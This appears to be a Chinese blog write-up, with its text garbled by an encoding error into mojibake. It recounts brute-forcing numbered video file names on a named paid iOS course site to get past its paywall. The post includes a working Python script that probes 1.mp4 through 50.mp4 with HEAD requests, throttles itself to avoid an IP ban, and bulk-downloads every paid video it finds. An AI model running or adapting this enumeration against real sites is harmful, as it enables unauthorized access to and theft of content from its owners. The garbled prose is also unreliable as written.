# ğŸ¯ åˆ©ç”¨ Python æ¢æµ‹éšè—è§†é¢‘èµ„æºè·¯å¾„çš„å…¨è¿‡ç¨‹è®°å½•

> ä¸€æ¬¡å¥½å¥‡ + æŠ€æœ¯åŠ¨æ‰‹å®è·µï¼Œä»å…è´¹è¯•å¬è¯¾çš„è§†é¢‘é“¾æ¥å¼€å§‹ï¼Œåˆ°è‡ªåŠ¨æ¢æµ‹æ•´ä¸ªè§†é¢‘èµ„æºç›®å½•ï¼Œæœ€ç»ˆæˆåŠŸæå–å’Œæ‰¹é‡ä¸‹è½½ç›®æ ‡è§†é¢‘æ–‡ä»¶ã€‚

---

## ğŸ§© èµ·å› ä¸é—®é¢˜èƒŒæ™¯
åœ¨ä¸€æ¬¡æµè§ˆæŸ iOS ç›¸å…³çš„**ä»˜è´¹è¯¾ç¨‹ç½‘ç«™**æ—¶ï¼Œæˆ‘æ³¨æ„åˆ°è¯¥å¹³å°æä¾›äº†ç¬¬ä¸€è®²çš„å…è´¹è§†é¢‘è¯•å¬ã€‚
åœ¨æ’­æ”¾é¡µé¢ä¸­ï¼Œé€šè¿‡æµè§ˆå™¨çš„å³é”®èœå•æˆ–å¼€å‘è€…å·¥å…·å¤åˆ¶è§†é¢‘åœ°å€ï¼Œå‘ç°å…¶é“¾æ¥æ˜¯å¦‚ä¸‹æ ¼å¼çš„ç›´é“¾ï¼š
```
https://moemiku.com/video/ios/8.mp4
```

è¯¥é“¾æ¥å¯**ç›´æ¥è®¿é—®ã€æ’­æ”¾æˆ–ä¸‹è½½**ï¼Œå¹¶ä¸éœ€è¦ç™»å½•éªŒè¯ã€token æˆæƒæˆ– Referer é™åˆ¶ã€‚ç”±æ­¤å¼•å‘äº†æˆ‘çš„å…´è¶£ï¼š
> æ˜¯å¦è¯¥è¯¾ç¨‹çš„å…¶ä»–è§†é¢‘ä¹Ÿé‡‡ç”¨äº†ç±»ä¼¼çš„æ–¹å¼ä¸Šä¼ åœ¨åŒä¸€ç›®å½•ä¸­ï¼Ÿ

äºæ˜¯æˆ‘å°è¯•è®¿é—®ç›®å½•åœ°å€ï¼š

```
https://moemiku.com/video/ios/
```

å¸Œæœ›è·å–ç›®å½•åˆ—è¡¨ï¼Œä½†æœåŠ¡å™¨è¿”å›äº† **403 Forbidden** é”™è¯¯ã€‚è¿™è¯´æ˜è¯¥ç½‘ç«™çš„æœåŠ¡å™¨ï¼ˆnginxï¼‰**ç¦æ­¢åˆ—å‡ºç›®å½•å†…å®¹**ï¼Œåªèƒ½é€šè¿‡æ˜ç¡®çš„æ–‡ä»¶åæ¥è®¿é—®èµ„æºã€‚
æ­¤å¤–ï¼Œè¯¥ç½‘ç«™çš„ä¸»é¡µæ˜¯åŸºäº WordPress æ­å»ºçš„ï¼Œæˆ‘è¿›ä¸€æ­¥å°è¯•ä»å¤šä¸ªè§’åº¦æ¢ç´¢èµ„æºè·¯å¾„ï¼š
- æŸ¥çœ‹ HTML é¡µé¢æºç å’Œ JavaScript åŠ¨æ€åŠ è½½é€»è¾‘
- åˆ†ææµè§ˆå™¨ `Network` æŠ“åŒ…ä¿¡æ¯
- è¯·æ±‚ WordPress çš„ REST API æ¥å£ï¼ˆå¦‚ `/wp-json/wp/v2/posts`ï¼‰
- æŸ¥çœ‹ `/feed/` RSSã€`/sitemap.xml` ç­‰å…¬å¼€å†…å®¹ç´¢å¼•
æœ€ç»ˆç¡®è®¤è¯¥è·¯å¾„ä¸‹çš„ `.mp4` æ–‡ä»¶å¹¶æœªè¢«ç›´æ¥å¼•ç”¨åœ¨ä»»ä½•æ–‡ç« æˆ–å¯ç´¢å¼•é¡µé¢ä¸­ã€‚

ä¸æ­¤åŒæ—¶ï¼Œä»å®é™…æŠ“åˆ°çš„å‡ ä¸ª `.mp4` é“¾æ¥æ¥çœ‹ï¼Œå®ƒä»¬é‡‡ç”¨äº†æ˜æ˜¾çš„**ç¼–å·å‘½å**ï¼ˆå¦‚ `1.mp4`, `8.mp4`, `12.mp4` ç­‰ï¼‰ï¼Œæ¨æµ‹èµ„æºç›®å½•é‡‡ç”¨äº†**æ•°å­—åºåˆ—çš„æ–‡ä»¶åæ–¹å¼å­˜å‚¨è§†é¢‘**ã€‚
å› æ­¤ï¼Œä¸ºäº†è·å–è¯¥ç›®å½•ä¸‹å…¨éƒ¨å¯ç”¨çš„è§†é¢‘èµ„æºï¼Œæˆ‘å†³å®šä½¿ç”¨ç¼–ç¨‹æ–¹å¼è¿›è¡Œ**æš´åŠ›æ¢æµ‹ä¸æ–‡ä»¶åæšä¸¾æ‰«æ**ã€‚

---

## ğŸ•µï¸â€â™‚ï¸ æ¢æµ‹è¿‡ç¨‹å’Œé‡åˆ°çš„éšœç¢

### âŒ ç›®å½•è®¿é—®å—é™

è®¿é—®ï¼š
```
https://moemiku.com/video/ios/
```
è¿”å›ï¼š
```
403 Forbiddenï¼ˆç¦æ­¢è®¿é—®ç›®å½•ï¼‰
```

è¯´æ˜æœåŠ¡å™¨å…³é—­äº†ç›®å½•ç´¢å¼•ï¼ˆIndex Listingï¼‰ã€‚

---

### âŒ é¡µé¢ä¸­æ— è§†é¢‘å¼•ç”¨

å°è¯•çš„é€”å¾„åŒ…æ‹¬ï¼š

- `/feed/`ï¼ˆRSSï¼‰ â†’ æ²¡æœ‰ `.mp4` é“¾æ¥
- `/wp-json/wp/v2/posts`ï¼ˆREST APIï¼‰ â†’ æ²¡æœ‰å¼•ç”¨è¯¥è§†é¢‘ç›®å½•
- é¡µé¢ HTML å’Œ JS æºç  â†’ æ²¡æœ‰ç¡¬ç¼–ç  `.mp4` è·¯å¾„
- `sitemap.xml` â†’ æ— èµ„æºç›®å½•ä¿¡æ¯

---

## âœ… æŠ€æœ¯å†³ç­–ï¼šæš´åŠ›æ–‡ä»¶åæ¢æµ‹

ä»ç°æœ‰çš„å·²çŸ¥åœ°å€ `8.mp4` æ¨æµ‹ï¼Œè¯¥ç›®å½•ä¸‹çš„è§†é¢‘é‡‡ç”¨**ç¼–å·å‘½åï¼ˆå¦‚ 1.mp4 ~ N.mp4ï¼‰**ã€‚
å› æ­¤ï¼Œæˆ‘ä½¿ç”¨ Python ç¼–å†™è„šæœ¬ï¼Œæš´åŠ›æ¢æµ‹ `1.mp4` ~ `N.mp4` æ˜¯å¦å­˜åœ¨ï¼Œè‡ªåŠ¨è¿‡æ»¤ `404`ï¼Œè®°å½•æœ‰æ•ˆèµ„æºï¼Œå¹¶æœ€ç»ˆä¸‹è½½ã€‚
---

## ğŸ”§ Python è„šæœ¬ï¼šæ¢æµ‹ + ä¸‹è½½

```python
import requests
import time
import os

base_url = "https://moemiku.com/video/ios/"
headers = {"User-Agent": "Mozilla/5.0"}

start_id = 1
end_id = 50  # å¯è°ƒæ•´èŒƒå›´
found = []

for i in range(start_id, end_id + 1):
    url = f"{base_url}{i}.mp4"
    try:
        r = requests.head(url, headers=headers, timeout=1)
        if r.status_code == 200:
            print(f"âœ… å­˜åœ¨: {url}")
            found.append(url)
    except:
        pass
    time.sleep(0.2)  # é™é€Ÿï¼Œé˜²æ­¢å°IP

if found:
    with open("found_videos.txt", "w") as f:
        f.writelines(link + "\n" for link in found)

    os.makedirs("downloaded_videos", exist_ok=True)
    for url in found:
        name = url.split("/")[-1]
        r = requests.get(url, headers=headers, stream=True)
        with open(f"downloaded_videos/{name}", "wb") as f:
            for chunk in r.iter_content(8192):
                f.write(chunk)
        print(f"â¬‡ ä¸‹è½½å®Œæˆ: {name}")
else:
    print("â— æœªå‘ç°è§†é¢‘")
```

---

